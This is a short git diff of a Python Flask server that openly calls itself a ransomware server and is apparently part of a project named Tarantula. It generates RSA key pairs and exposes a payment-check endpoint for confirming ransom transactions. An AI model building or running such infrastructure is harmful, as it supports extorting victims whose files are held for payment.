@@ -1,14 +1,12 @@
 from flask import Flask, request, jsonify
-from tinydb import TinyDB, Query
+from tinydb import Query
 from db import *
-from netlib import *
 from crypto import *
 
 if (os.path.exists("public-key.pub") == False):
     generate_rsa_key_pairs()
 
-server = Flask("My Shiny Tarantula Server")
-# server.logger.disabled = True
+server = Flask("My shiny ransomware server")
 db = Database("tarantula.json", "./")
 
 confirmedTransactions = [
@@ -50,4 +48,4 @@ def payment_check():
             "message": "Transaction is not confirmed"
         })
 
-server.run(host=get_my_ip_address(), port=9990)
+server.run(host='0.0.0.0', port=9990)
